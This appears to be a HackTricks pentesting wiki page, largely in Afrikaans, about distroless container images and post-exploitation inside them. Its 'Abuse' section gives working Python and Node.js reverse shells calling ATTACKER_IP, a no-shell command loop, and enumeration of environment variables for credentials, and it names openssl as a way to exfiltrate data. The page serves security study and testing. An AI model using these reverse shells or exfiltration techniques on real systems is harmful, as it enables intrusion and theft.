# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

A **distroless** container image is an image that ships the **minimum runtime components required to run one specific application**, while intentionally removing the usual distribution tooling such as package managers, shells, and large sets of generic userland utilities. In practice, distroless images often contain only the application binary or runtime, its shared libraries, certificate bundles, and a very small filesystem layout.

Die punt is nie dat distroless 'n nuwe kernel isolation primitive is nie. Distroless is 'n **image design strategy**. Dit verander wat beskikbaar is **binne** die container filesystem, nie hoe die kernel die container isoleer nie. Daardie onderskeid is belangrik, want distroless verskerp die omgewing hoofsaaklik deur te verminder wat 'n aanvaller kan gebruik nadat hy code execution verkry het. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux, of enige ander runtime isolation-meganisme nie.

## Waarom Distroless Bestaan

Distroless images word hoofsaaklik gebruik om te verminder:

- die image-grootte
- die operasionele kompleksiteit van die image
- die aantal pakkette en binaries wat kwesbaarhede kan bevat
- die aantal post-exploitation tools wat standaard aan 'n aanvaller beskikbaar is

Dit is hoekom distroless images gewild is in produksie-applikasie-deployments. 'n Container wat geen shell, geen package manager, en byna geen generiese hulpmiddels bevat nie, is gewoonlik makliker om opsioneel oor te dink en moeiliker om interaktief te misbruik ná kompromie.

Voorbeelde van bekende distroless-styl image-families sluit in:

- Google's distroless images
- Chainguard hardened/minimal images

## Wat Distroless Nie Beteken Nie

'n Distroless container is **nie**:

- outomaties rootless
- outomaties non-privileged
- outomaties read-only
- outomaties beskerm deur seccomp, AppArmor, of SELinux
- outomaties veilig teen container escape

Dit is steeds moontlik om 'n distroless image te laat loop met `--privileged`, host namespace sharing, gevaarlike bind mounts, of 'n gemonteerde runtime socket. In daardie scenario mag die image minimaal wees, maar die container kan steeds katastrofaal onseker wees. Distroless verander die **userland attack surface**, nie die **kernel trust boundary** nie.

## Tipiese Operasionele Kenmerke

Wanneer jy 'n distroless container kompromitteer, is die eerste ding wat jy gewoonlik opgemerk dat algemene aannames ophou waar te wees. Daar mag geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat` wees nie, en soms nie eens 'n libc-gebaseerde omgewing wat optree soos jou gewone tradecraft verwag nie. Dit raak beide aanval en verdediging, want die gebrek aan hulpmiddels maak debugging, incident response, en post-exploitation anders.

Die algemeenste patrone is:

- die toepassingsruntime bestaan, maar baie min anders doen
- shell-gebaseerde payloads misluk omdat daar geen shell is nie
- algemene enumerasie one-liners misluk omdat die helper binaries afwesig is
- lêerstelselbeskermings soos read-only rootfs of `noexec` op skryfbare tmpfs-lokaliteite is dikwels ook teenwoordig

Daardie kombinasie is gewoonlik wat mense laat praat oor "weaponizing distroless".

## Distroless en Post-Exploitation

Die hoof offensiewe uitdaging in 'n distroless omgewing is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die uitgebuite workload code execution gee in 'n taal runtime soos Python, Node.js, Java, of Go, mag jy in staat wees om arbitrêre logika uit te voer, maar nie deur die normale shell-sentriese workflows wat algemeen is in ander Linux-teikens nie.

Dit beteken post-exploitation skuif dikwels na een van drie rigtings:

1. **Gebruik die bestaande taal runtime direk** om die omgewing te enumereer, sockets oop te maak, lêers te lees, of addisionele payloads te stage.
2. **Bring jou eie hulpmiddels in memory** as die filesystem read-only is of skryfbare lokaliteite gemonteer is met `noexec`.
3. **Misbruik bestaande binaries wat reeds in die image is** as die toepassing of sy dependencies iets onverwags nuttigs insluit.

## Abuse

### Enumereer die runtime wat jy reeds het

In baie distroless containers is daar geen shell nie, maar daar is steeds 'n toepassingsruntime. As die teiken 'n Python-diens is, is Python daar. As die teiken Node.js is, is Node daar. Dit gee dikwels genoeg funksionaliteit om lêers te enumereer, omgewingsveranderlikes te lees, reverse shells oop te maak, en in-memory uitvoering te stage sonder om ooit `/bin/sh` aan te roep.

A simple example with Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
'n eenvoudige voorbeeld met Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impak:

- herwinning van omgewingveranderlikes, dikwels insluitend credentials of diens-eindpunte
- lêerstelsel-ontleding sonder `/bin/ls`
- identifisering van skryfbare paaie en gemonteerde geheime

### Reverse Shell sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, kan 'n klassieke shell-gebaseerde reverse shell onmiddellik misluk. In daardie situasie, gebruik eerder die geïnstalleerde taal runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
As `/bin/sh` nie bestaan nie, vervang die laaste reël met direkte Python-gedrewe opdraguitvoering of 'n Python REPL-lus.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nogmaals, as `/bin/sh` afwesig is, gebruik Node se filesystem-, process- en networking-APIs direk in plaas daarvan om 'n shell te spawn.

### Volledige voorbeeld: No-Shell Python Command Loop

As die image Python het maar glad nie 'n shell nie, is 'n eenvoudige interaktiewe lus dikwels genoeg om volle post-exploitation vermoë te behou:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dit vereis nie 'n interaktiewe shell binary nie. Die impak is effektief dieselfde as 'n basic shell vanuit die aanvaller se perspektief: command execution, enumeration, en staging van verdere payloads deur die bestaande runtime.

### In-Memory Tool Execution

Distroless images word dikwels gekombineer met:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Daardie kombinasie maak die klassieke "download binary to disk and run it" workflows onbetroubaar. In daardie gevalle word memory execution techniques die hoofantwoord.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Sommige distroless images bevat steeds operasionele noodsaaklike binaries wat na kompromissie nuttig raak. 'n Gereeld waargenome voorbeeld is `openssl`, omdat toepassings dit soms vir crypto- of TLS-verwante take benodig.

'n Vinnige soekpatroon is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
As `openssl` beskikbaar is, kan dit moontlik gebruik word vir:

- uitgaande TLS-verbindinge
- data exfiltration oor 'n toegelate egress-kanaal
- staging van payload-data deur encoded/encrypted blobs

Die presiese misbruik hang af van wat eintlik geïnstalleer is, maar die algemene idee is dat distroless nie "no tools whatsoever" beteken nie; dit beteken "far fewer tools than a normal distribution image".

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die image in praktyk werklik distroless is en watter runtime of helper binaries nog beskikbaar is vir post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Wat hier interessant is:

- If no shell exists but a runtime such as Python or Node is present, post-exploitation should pivot to runtime-driven execution.
- If the root filesystem is read-only and `/dev/shm` is writable but `noexec`, memory execution techniques become much more relevant.
- If helper binaries such as `openssl`, `busybox`, or `java` exist, they may offer enough functionality to bootstrap further access.

## Standaardinstellings van runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimale userland per ontwerp | Geen shell, geen package manager, slegs toepassing/runtime-afhanklikhede | toevoeging van debugging-lae, sidecar shells, kopieer busybox of gereedskap in |
| Chainguard minimal images | Minimale userland per ontwerp | Verminderde pakket-oppervlak, dikwels gefokus op een runtime of diens | gebruik van `:latest-dev` of debug-variante, kopieer gereedskap tydens build |
| Kubernetes workloads using distroless images | Hang af van Pod-konfigurasie | Distroless raak net userland; Pod se sekuriteitshouding hang steeds af van die Pod-spec en runtime-standaarde | toevoeging van ephemerale debug-containers, host mounts, privileged Pod-instellings |
| Docker / Podman running distroless images | Hang af van run-flags | Minimale filesystem, maar runtime-sekuriteit hang steeds af van flags en daemon-konfigurasie | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Die sleutelpunt is dat distroless 'n **image-eienskap** is, nie 'n runtime-beskerming nie. Sy waarde kom van die verminderde beskikbaarheid binne die filesisteem na 'n kompromie.

## Verwante Bladsye

Vir filesystem en memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir container runtime, socket, en mount-misbruik wat steeds van toepassing is op distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
